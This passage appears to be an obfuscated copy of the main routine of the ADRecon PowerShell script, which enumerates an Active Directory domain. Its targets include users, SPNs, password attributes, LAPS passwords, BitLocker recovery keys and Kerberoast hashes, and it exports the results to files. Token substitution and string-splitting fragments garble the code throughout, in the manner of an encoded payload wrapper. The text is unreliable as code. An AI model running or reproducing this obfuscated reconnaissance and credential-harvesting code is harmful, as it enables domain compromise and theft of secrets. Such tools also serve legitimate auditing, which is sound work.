                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Collections.NonGeneric.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEz'+'jmscorlib.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjnetstandard.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Runtime.Extensions.dlllEzj)
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.CollectionslEzj)).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.Collections.NonGenericlEzj)).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjmscorliblEzj)).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjnetstandardlEzj)).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.Runtime.ExtensionslEzj)).Location
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Threading.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Threading.Thread.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Co'+'nsole.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Diagnostics.TraceSource.dlllEzj)
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjMicrosoft.ActiveDirectory.ManagementlEzj)).Location
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Net.Primitives.dlllEzj)
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.Security.AccessControllEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.IO.FileSystem.AccessControllEzj)).Location
                    #(Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Security.dlllEzj)
                    #(Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Security.Principal.dlllEzj)
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.Security.PrincipallEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.Security.Principal.WindowslEzj)).Location
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Xml.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Xml.XmlDocument.dlllEzj)
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Xml.ReaderWriter.dlllEzj)
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.XMLlEzj)).Location
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Net.Sockets.dlllEzj)
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.RuntimelEzj)).Location
                    #(Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Runtime.dlllEzj)
                    #(Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Runtime.InteropServices.RuntimeInformation.dlllEzj)
                ))
                Remove-Variable refFolder
                # Todo Error: you may need to supply runtime policy
            }
            #>
            If (bLHCLR -eq lEzj4lEzj)
            {
                Add-Type -TypeDefinition bLH(bLHADWSSource+bLHPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([S'+'ystem.Reflection.Assembly]::LoadWithPartialName(lEzjMicrosoft.ActiveDirectory.ManagementlEzj)).Location
             '+'       ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.DirectoryServiceslEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.XMLlEzj)).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition bLH(bLHADWSSource+bLHPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjMicrosoft.ActiveDirectory.ManagementlEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.DirectoryServiceslEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.XMLlEzj)).Location
                )) -Language CSharpVersion3
            }
        }

        If (bLHMethod -eq xfJ4LDAPxfJ4)
        {
            If (bLHCLR -eq lEzj4lEzj)
            {
                Add-Type -TypeDefinition bLH(bLHLDAPSource+bLHPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.DirectoryServiceslEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.XMLlEzj)).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition bLH(bLHLDAPSource+bLHPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.DirectoryServic'+'eslEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.XMLlEzj)).Location
                )) -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output lEzj[Invoke-ADRecon] bLH(bLH_.Exception.Message)lEzj
        Return bLHnull
    }
    If (bLHSaveDebugPreference)
    {
        bLHscript:DebugPreference = bLHSaveDebugPreference
        Remove-Variable SaveDebugPreference
    }

    # Allow running using RUNAS from a non-domain joined machine
    # runas /user:<Domain FQDN>cnI<Username> /netonly powershell.exe
    If ((bLHMethod -eq xfJ4LDAPxfJ4) -and (bLHUseAltCreds) -and (bLHDomainController -eq lEzjlEzj) -and (bLHCredential -eq [Management.Automation.PSCredential]::Empty))
    {
        Try
        {
            bLHobjDomain = [ADSI]lEzjlEzj
            If(!(bLHobjDomain.name))
            {
                Write-Verbose lEzj[Invoke-ADRecon] RUNAS Check, LDAP bind UnsuccessfullEzj
            }
            bLHUseAltCreds = bLHfalse
            bLHobjDomain.Dispose()
        }
        Catch
        {
            bLHUseAltCreds = bLHtrue
        }
    }

    If (bLHUseAltCreds -and ((bLHDomainController -eq lEzjlEzj) -or (bLHCredential -eq [Management.Automation.PSCredential]::Empty)))
    {

        If ((bLHDomainController -ne lEzjlEzj) -and (bLHCredential -eq [Management.Automation.PSCredential]::Empty))
        {
          '+'  Try
            {
                bLHCredential = Get-Credential
            }
            Catch
            {
                Write-Output lEzj[Invoke-ADRecon] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
        }
    '+'    Else
        {
            Write-Output lEzjRun Get-Help .cnIADRecon.ps1 -Examples for additional information.lEzj
            Write-Output lEzj[Invoke-ADRecon] Use the -DomainController and -Credential parameter.lEzjpwOn
            Return bLHnull
        }
    }

    Write-Output lEzj[*] Running on bLHRanonComputerlEzj

    Switch (bLHCollect)
    {
        xfJ4ForestxfJ4 { bLHADRForest = bLHtrue }
        xfJ4DomainxfJ4 {bLHADRDomain = bLHtrue }
        xfJ4TrustsxfJ4 { bLHADRTrust = bLHtrue }
      '+'  xfJ4SitesxfJ4 { bLHADRSite = bLHtrue }
        xfJ4SubnetsxfJ4 { bLHADRSubnet = bLHtrue }
        xfJ4SchemaHistoryxfJ4 { bLHADRSchemaHistory = bLHtrue }
        xfJ4PasswordPolicyxfJ4 { bLHADRPasswordPolicy = bLHtrue }
        xfJ4FineGrainedPasswordPolicyxfJ4 { bLHADRFineGrainedPasswordPolicy = bLHtrue }
        xfJ4DomainControllersxfJ4 { bLHADRDomainControllers = bLHtrue }
      '+'  xfJ4UsersxfJ4 { bLHADRUsers = bLHtrue }
        xfJ4UserSPNsxfJ4 { bLHADRUserSPNs = bLHtrue }
        xfJ4PasswordAttributesxfJ4 { bLHADRPasswordAttributes = bLHtrue }
        xfJ4GroupsxfJ4 {bLHADRGro'+'ups = bLHtrue }
       '+' xfJ4GroupChangesxfJ4 { bLHADRGroupChanges = bLHtrue }
        xfJ4GroupMembersxfJ4 { bLHADRGroupMembers = bLHtrue }
        xfJ4OUsxfJ4 { bLHADROUs = bLHtrue }
        xfJ4GPOsxfJ4 { bLHADRGPOs = bLHtrue }
        xfJ4gPLinksxfJ4 { bLHADRgPLinks = bLHtrue }
        xfJ4DNSZonesxfJ4 { bLHADRDNSZones = bLHtrue }
        xfJ4DNSRecordsxfJ4 { bLHADRDNSRecords = bLHtrue }
        xfJ4PrintersxfJ4 { bLHADRPrinters = bLHtrue }
        xfJ4ComputersxfJ4 { bLHADRComputers = bLHtrue }
        xfJ4ComputerSPNsxfJ4 { bLHADRComputerSPNs = bLHtrue }
        xfJ4LAPSxfJ4 { bLHADRLAPS = bLHtrue }
        xfJ4BitLockerxfJ4 { bLHADRBitLocker = bLHtrue }
        xfJ4ACLsxfJ4 { bLHADRACLs = bLHtrue }
        xfJ4GPOReportxfJ4
        {
            bLHADRG'+'POReport = bLHtrue
            bLHADRCreate = bLHtrue
        }
        x'+'fJ4KerberoastxfJ4 { bLHADRKerberoast = bLHtrue }
        xfJ4DomainAccountsusedforServiceLogonxfJ4 { bLHADRDomainAccountsusedforServiceLogon = bLHtrue }
        xfJ4DefaultxfJ4
        {
            bLHADRForest = bLHtrue
            bLHADRDomain = bLHtrue
            bLHADRTrust = bLHtrue
            bLHADRSite = bLHtrue
            bLHADRSubnet = bLHtrue
            bLHADRSchemaHistory = bLHtrue
            bLHADRPasswordPolicy = bLHtrue
            bLHADRFineGrainedPasswordPolicy = bLHtrue
            bLHADRDomainControllers = bLHtrue
            bLHADRUsers = bLHtrue
            bLHADRUserSPNs = bLHtrue
            bLHADRPasswordAttributes = bLHtrue
            bLHADRGroups = bLHtrue
            bLHADRGroupMembers = bLHtrue
            bLHADRGroupChanges = bLHtrue
            bLHADROUs = bLHtrue
            bLHADRGPOs = bLHtrue
            bLHADRgPLinks = bLHtrue
            bLHADRDNSZones = bLHtrue
            bLHADRDNSRecords = bLHtrue
            bLHADRPrinters = bLHtr'+'ue
            bLHADRComputers = bLHtrue
            bLHADRComputerSPNs = bLHtrue
            bLHADRLAPS = bLHtrue
            bLHADRBitLocker = bLHtrue
            #bLHADRACLs = bLHtrue
            bLHADRGPOReport = bLHtrue
            #bLHADRKerberoast = bLHtrue
            #bLHADRDomainAccountsusedforServiceLogon = bLHtrue

            If (bLHOutputType -eq lEzjDefaultlEzj)
            {
                [array] bLHOutputType = lEzjCSVlEzj,lEzjExcellEzj
            }
        }
    }

    Switch (bLHOutputType)
    {
        xfJ4STDOUTxfJ4 { bLHADRSTDOUT = bLHtrue }
        xfJ4CSVxfJ4
        {
            bLHADRCSV = bLHtrue
            bLHADRCreate = bLHtrue
        }
        xfJ4XMLxfJ4
        {
            bLHADRXML = bLHtrue
            bLHADRCreate = bLHtrue
        }
        xfJ4JSONxfJ4
        {
            bLHADRJSON = bLHtrue
            bLHADRCreate = bLHtrue
        }
        xfJ4HTMLxfJ4
        {
            bLHADRHTML = bLHtrue
            bLHADRCreate = bLHtrue
        }
        xfJ4ExcelxfJ4
        {
            bLHADRExcel = bLHtrue
            bLHADRCreate = bLHtrue
        }
        xfJ4AllxfJ4
        {
            #bLHADRSTDOUT = bLHtrue
            bLHADRCSV = bLHtrue
            bLHADRXML = bLHtrue
            bLHADRJSON = bLHtrue
            bLHADRHTML = bLHtrue
            bLHADRExcel = bLHtrue
            bLHADRCreate = bLHtrue
            [array] bLHOutputType = lEzjCSVlEzj,lEzjXMLlEzj,lEzjJSONlEzj,lEzjHTMLlEzj,lEzjExcellEzj
        }
        xfJ4DefaultxfJ4
        {
            [array] bLHOutputType = lEzjSTDOUTlEzj
            bLHADRSTDOUT = bLHtrue
        }
    }

    If ( (bLHADRExcel) -'+'and (-Not bLHADRCSV) )
    {
        bLHADRCSV = bLHtrue
        [array] bLHOutputType += lEzjCSVlEzj
    }

    bLHreturndir = Get-Location
    bLHdate = Get-Date

    # Create Output dir
    If ( (bLHADROutputDir) -and (bLHADRCreate) )
    {
        If (!(Test-Path bLHADROutputDir))
        {
            New-Item bLHADROutputDir -type directory 0Ogv Out-Null
            If (!(Test-Path bLHADROutputDir))
            {
                Write-Output lEzj[Invoke-ADRecon] Error, invalid OutputDir Path ... ExitinglEzj
                Return bLHnull
            }
        }
        bLHADROutputDir = bLH((Convert-Path bLHADROutputDir).TrimEnd(lEzjcnIlEzj))
        Write-Verbose lEzj[*] Output Directory: bLHADROutputDirlEzj
    }
    ElseIf (bLHADRCreate)
    {
        bLHADROutputDir =  -join(bLHreturndir,xfJ4cnIxfJ4,xfJ4ADRecon-Report-xfJ4,bLH(Get-Date -UFormat %Y%m%d%H%M%S))
        New-Item bLHADROutputDir -type directory 0Ogv Out-Null
        If (!(Test-Path bLHADROutputDir))
        {
            Write-Output lEzj[Invoke-ADRecon] Error, could not create output directorylEzj
            Return bLHnull
        }
        bLHADROutputDir = bLH((Convert-Path bLHADROutputDir).TrimEnd(lEzjcnIlEzj))
        Remove-Variable ADRCreate
    }
    Else
    {
        bLHADROutputDir = bLHreturndir
    }

    If (bLHADRCSV)
    {
        bLHCSVPath = [System.IO.DirectoryInfo] -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4CSV-FilesxfJ4)
        New-Item bLHCSVPath -type directory 0Ogv Out-Null
        If (!(Test-Path bLHCSVPath))
        {
            Write-Output lEzj[Invoke-ADRecon] Error, could not create output directorylEzj
            Return bLHnull
        }
        Remove-Variable ADRCSV
  '+'  }

    If (bLHADRXML)
    {
        bLHXMLPath = [System.IO.DirectoryInfo] -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4XML-FilesxfJ4)
        New-Item bLHXMLPath -type directory 0Ogv Out-Null
        If (!(Test-Path bLHXMLPath))
        {
            Write-Output lEzj[Invoke-ADRecon] Error, could not create output directorylEzj
            Return bLHnull
        }
        Remove-Variable ADRXML
    }

    If (bLHADRJSON)
    {
        bLHJSONPath = [System.IO.DirectoryInfo] -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4JSON-FilesxfJ4)
        New-Item bLHJSONPath -type directory 0Ogv Out-Null
        If (!(Test-Path bLHJSONPath))
        {
            Write-Output lEzj[Invoke-ADRecon] Error, could not create output directorylEzj
            Return bLHnull
        }
        Remove-Variable ADRJSON
    }

    If'+' (bLHADRHTML)
    {
        bLHHTMLPath = [System.IO.DirectoryInfo] -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4HTML-FilesxfJ4)
        New-Item bLHHTMLPath -type directory 0Ogv Out-Null
        If (!(Test-Path bLHHTMLPath))
        {
            Write-Output lEzj[Invoke-ADRecon] Error, could not create output directorylEzj
            Return bLHnull
        }
        Remove-Variable ADRHTML
    }

    # AD Login
    If (bLHUseA'+'ltCreds -and (bLHMethod -eq xfJ4ADWSxfJ4))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
    '+'            New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root lEzjlEzj -Server bLHDomainController -Credential bLHCredential -ErrorAction Stop 0Ogv Out-Null
            }
            Catch
            {
                Write-Output lEzj[Invoke-ADRecon] bLH(bLH_.Exception.Message)lEzj
                If (bLHADROutputDir)
                {
                    Remove-EmptyADROutputDir bLHADROutputDir bLHOutputType
                }
                Return bLHnull
            }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root'+' lEzjlEzj -Server bLHDomainController -Credential bLHCredential -ErrorAction Stop 0Ogv Out-Null
            }
            Catch
            {
                '+'Write-Output lEzj[Invoke-ADRecon] bLH(bLH_.Exception.Message)lEzj
                If (bLHADROutputDir)
                {
                    Remove-EmptyADROutputDir bLHADROutputDir bLHOutputType
                }
                Return bLHnull
            }
        }
        Set-Location ADR:
        Write-Debug lEzjADR PSDrive CreatedlEzj
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHUseAltCreds)
        {
            Try
            {
                bLHobjDomain = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                bLHobjDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/RootDSElEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
            }
            Catch
            {
                Write-Output lEzj['+'Invoke-ADRecon] bLH(bLH_.Exception.Message)lEzj
                If (bLHADROutputDir)
                {
                    Remove-EmptyADROutputDir '+'bLHADROutputDir bLHOutputType
                }
                Return bLHnull
            }
            If(!(bLHobjDomain.name))
            {
                Write-Output lEzj[Invoke-ADRecon] LDAP bind UnsuccessfullEzj
                If (bLHADROutputDir)
                {
                    Remove-EmptyADROutputDir bLHADROutputDir bLHOutputType
                }
                Return bLHnull
            }
            Else
            {
                Write-Output lEzj[*] LDAP bind SuccessfullEzj
            }
        }
        Else
        {
            bLHobjDomain = [ADSI]lEzjlEzj
            bLHobjDomainRootDSE = ([ADSI] lEzjLDAP://RootDSElEzj)
            If(!(bLHobjDomain.name))
            {
                Write-Output lEzj[Invoke-ADRecon] LDAP bind UnsuccessfullEzj
                If (bLHADROutputDir)
                {
                    '+'Remove-EmptyADROutputDir bLHADROutputDir bLHOutputType
                }
                Return bLHnull
            }
        }
        Write-Debug lEzjLDAP Bing SuccessfullEzj
    }

    Write-Output lEzj[*] Commencing - bLHdatelEzj
    If (bLHADRDomain)
    {
        Write-Output lEzj[-] DomainlEzj
        bLHADRObject = Get-ADRDomain -Method bLHMethod -objDomain bLHobjDomain -objDomainRootDSE bLHobjDomainRootDSE -DomainController bLHDomainController -Credential bLHCredential
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -'+'ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjDomainlEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If (bLHADRForest)
    {
        Write-Output lEzj[-] ForestlEzj
        bLHADRObject = Get-ADRForest -Method bLHMethod -objDomain bLHobjDomain -objDomainRootDSE bLHobjDomainRootDSE -DomainController bLHDomainController -Credential bLHCredential
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROu'+'tputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjForestlEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If (bLHADRTrust)
    {
        Write-Output lEzj[-] TrustslEzj
        bLHADRObject = Get-ADRTrust -Method bLHMethod -objDomain bLHobjDomain
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjTrustslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If (bLHADRSite)
    {
        Writ'+'e-Output lEzj[-] SiteslEzj
        bLHADRObject = Get-ADRSite -Method bLHMethod -objDomain bLHobjDomain -objDomainRootDSE bLHobjDomainRootDSE -DomainController bLHDomainController -Credential bLHCredential
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjSiteslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If (bLHADRSubnet)
    {
        Write-Output lEzj[-] SubnetslEzj
        bLHADRObject = Get-ADRSubnet -Method bLHMethod -objDomain bLHobjDomain -objDomainRootDSE bLHobjDomainRootDSE -DomainController bLHDomainController -Credential bLHCredential
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjSubnetslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If (bLHADRSchemaHistory)
    {
        Write-Output lEzj[-] SchemaHistory - May take some timelEzj
        bLHADRObject = Get-ADRSchemaHistory -Method bLHMethod -objDomain bLHobjDomain -objDomainRootDSE bLHobjDomainRootDSE -DomainController bLHDomainController -Credential bLHCredential
        If (bLHADRObject)
        {
         '+'   Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjSchemaHistorylEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSchemaHistory
    }
    If (bLHADRPasswordPolicy)
    {
        Write-Output lEzj[-] Default Password PolicylEzj
        bLHADRObject = Get-ADRDefaultPasswordPolicy -Method bLHMethod -objDomain bLHobjDomain
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjDefaultPasswordPolicylEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordPolicy
    }
    If (bLHADRFineGrainedPasswordPolicy)
    {
        Write-Output lEzj[-] Fine Grained Password Policy - May need a Privileged AccountlEzj
        bLHADRObject = Get-ADRFineGrainedPasswordPolicy -Method bLHMethod -objDomain bLHobjDomain
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjFineGrainedPasswordPolicylEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
    If (bLHADRDomainControllers)
    {
      '+'  Write-Output lEzj[-] Domain ControllerslEzj
        bLHADRObject = Get-ADRDomainController -Method bLHMethod -objDomain bLHobjDomain -Credential bLHCredential
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjDomainControllerslEzj
          '+'  Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If (bLHADRUsers -or bLHADRUserSPNs)
    {
        If (!bLHA'+'DRUserSPNs)
        {
            Write-Output lEzj[-] Users - May take some timelEzj
            bLHADRUserSPNs ='+' bLHfalse
        }
        ElseIf (!bLHADRUsers)
        {
            Write-Output lEzj[-] User SPNslEzj
            bLHADRUsers = bLHfalse
        }
        Else
        {
            Write-Output lEzj[-] Users and SPNs - May take some timelEzj
        }
        Get-ADRUser -Method bLHMethod -date bLHdate -objDomain bLHobjDomain -DormantTimeSpan bLHDormantTimeSpan -PageSize bLHPageSize -Threads bLHThreads -ADRUsers bLHADRUsers -ADRUserSPNs bLHADRUserSPNs
        Remove-Variable ADRUsers
        Remove-Variable ADRUserSPNs
    }
    If (bLHADRPasswordAttributes)
    {
        Write-Output lEzj[-] PasswordAttributes - ExperimentallEzj
        bLHADRObject = Get-ADRPasswordAttributes -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjPasswordAttributeslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttributes
    }
    If (bLHADRGroups -or bLHADRGroupChanges)
    {
        If (!bLHADRGroupChanges)
        {
            Write-Output lEzj[-] Groups - May take some timelEzj
            bLHADRGroupChanges = bLHfalse
        }
        ElseIf (!bLHADRGroups)
        {
            Write-Output lEzj[-] Group Membership Changes - May take some timelEzj
            bLHADRGroups = bLHfalse
        }
        Else
        {
          '+'  Write-Output lEzj[-] Groups and Membership Changes - May take some timelEzj
        }
        Get-ADRGroup -Method bLHMethod -date bLHdate -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRGroups bLHADRGroups -ADRGroupChanges bLHADRGroupChanges
        Remove-Variable ADRGroups
        Remove-Variable ADRGroupChanges
    }
    If (bLHADRGroupMembers)
    {
        Write-Output lEzj[-] Group Memberships - May take some timelEzj

        bLHADRObject = Get-ADRGroupMember -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjGroupMemberslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If (bLHADROUs)
    {
        Write-Output lEzj[-] OrganizationalUnits (OUs)lEzj
        bLHADRObject = Get-ADROU -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjOUslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If (bLHADRGPOs)
    {
        Write-Output lEzj[-] GPOslEzj
        bLHADRObject = Get-ADRGPO -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjGPOslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGPOs
    }
    If (bLHADRgPLinks)
    {
        Write-Output lEzj[-] gPLinks - Scope of Management (SOM)lEzj
        bLHADRObject = Get-ADRgPLink -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject'+' -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjgPLinkslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If (bLHADRDNSZones -or bLHADRDNSRecords)
    {
        If (!bLHADRDNSRecords)
        {
            Write-Output lEzj[-] DNS ZoneslEzj
            bLHADRDNSRecords = bLHfalse
        }
        ElseIf (!bLHADRDNSZones)
        {
            Write-Output lEzj[-] DNS RecordslEzj
            bLHADRDNSZones = bLHfalse
        }
        Else
        {
            Write-Output lEzj[-] DNS Zones and RecordslEzj
        }
        Get-ADRDNSZone -Method bLHMethod -objDomain bLHobjDomain -DomainController bLHDomainController -Credential bLHCredential -PageSize bLHPageSize -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRDNSZones bLHADRDNSZones -ADRDNSRecords bLHADRDNSRecords
        Remove-Variable ADRDNSZones
    }
    If (bLHADRPrinters)
    {
        Write-Output lEzj[-] PrinterslEzj
        bLHADRObject = Get-ADRPrinter -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjPrinterslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If (bLHADRComputers -or bLHADRComputerSPNs)
    {
        If (!bLHADRComputerSPNs)
        {
            Write-Output lEzj[-] Computers - May take some timelEzj
            bLHADRComputerSPNs = bLHfalse
        }
        ElseIf ('+'!bLHADRComputers)
        {
            Write-Output lEzj[-] Computer SPNslEzj
            bLHADRComputers = bLHfalse
        }
        Else
        {
            Write-Output lEzj[-] Computers and SPNs - May take some timelEzj
        }
        Get-ADRComputer -Method bLHMethod -date bLHdate -objDomain bLHobjDomain -DormantTimeSpan bLHDormantTimeSpan -PassMaxAge bLHPassMaxAge -PageSize bLHPageSize -Threads bLHThreads -ADRComputers bLHADRComputers -ADRComputerSPNs bLHADRComputerSPNs
        Remove-Variable ADRComputers
        Remove-Variable ADRComputerSPNs
    }
    If (bLHADRLAPS)
    {
        Write-Output lEzj[-] LAPS - Needs Privileged AccountlEzj
        bLHADRObject = Get-ADRLAPSCheck -Method bLHMethod -objDomain bLHobjDomain -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjLAPSlEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
    If (bLHADRBitLocker)
    {
        Write-Output lEzj[-] BitLocker Recovery Keys - Needs Privileged AccountlEzj
        bLHADRObject = Get-ADRBitLocker -Method bLHMethod -objDomain bLHobjDomain -DomainController bLHDomainController -Credential bLHCredential
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjBitLockerRecoveryKeyslEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If (bLHADRACLs)
    {
        Write-Output lEzj[-] ACLs - May take some timelEzj
        bLHADRObject = Get-ADRACL -Method bLHMethod -objDomain bLHobjDomain -DomainController bLHDomainController -Credential bLHCredential -PageSize bLHPageSize -Threads bLHThreads
        Remove-Variable ADRACLs
    }
    If (bLHADRGPOReport)
    {
        Write-Output lEzj[-] GPOReport - May take some timelEzj
        Get-ADRGPOReport -Method bLHMethod -UseAltCreds bLHUseAltCreds -ADROutputDir bLHADROutputDir
        Remove-Variable ADRGPOReport
    }
    If (bLHADRKerberoast)
    {
        Write-Output lEzj[-] KerberoastlEzj
        bLHADRObject = Get-ADRKerberoast -Method bLHMethod -objDomain bLHobjDomain -Credential bLHCredential -PageSize bLHPageSize
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjKerberoastlEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If (bLHADRDomainAccountsusedforServiceLogon)
    {
        Write-Output lEzj[-] Domain Accounts used for Service Logon - Needs Privileged AccountlEzj
        bLHADRObject = Get-ADRDomainAccountsusedforServiceLogon -Method bLHMethod -objDomain bLHobjDomain -Credential bLHCredential -PageSize bLHPageSize -Threads bLHThreads
        If (bLHADRObject)
        {
            Export-ADR -ADRObj bLHADRObject -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjDomainAccountsusedforServiceLogonlEzj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

